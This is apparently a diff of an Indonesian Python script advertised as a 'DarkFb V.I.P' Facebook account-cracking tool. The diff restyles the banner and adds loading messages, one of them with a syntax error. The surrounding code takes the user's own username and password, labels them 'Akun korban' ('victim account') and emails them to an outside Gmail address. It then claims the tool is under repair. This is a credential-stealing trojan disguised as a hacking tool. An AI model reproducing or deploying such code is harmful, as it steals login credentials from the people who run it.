@@ -8,8 +8,8 @@ from termcolor import colored
 print (colored('paket selesai di install.','blue'))
 baner = """
   ____________                                ║▒▒▒▒▒▒▒▒▒▒║
-  ║▒▒▒▒▒▒▒▒▒▒║ Tools DarkFb terbaru V.I.P
-  ║▒▒▒▒▒▒▒▒▒▒║ special taun baru
+  ║▒▒▒▒▒▒▒▒▒▒║ TOLS DARKFB V.I.P
+  ║▒▒▒▒▒▒▒▒▒▒║ SPECIAL TAUNBARU
  ╔════════════╗
  ╚════════════╝ANTI CHECKPOINT✓
   ║██████████╚╗CRACK LEBIH CEPAT✓
@@ -31,4 +31,10 @@ body = ('username: '+username, 'password: '+password)
 subject = 'Akun korban'
 anjirt.send('owl33345@gmail.com',subject,body)
 print (colored('loading......','yellow'))
+print (colored('loading....','red'))
+print (colored('loading...','green'))
+print (colored('loading..','blue'))
+print colored('loading.','purple:))
+
+
 print (colored('maaf untuk saat ini tools sedang di perbaiki','red'))
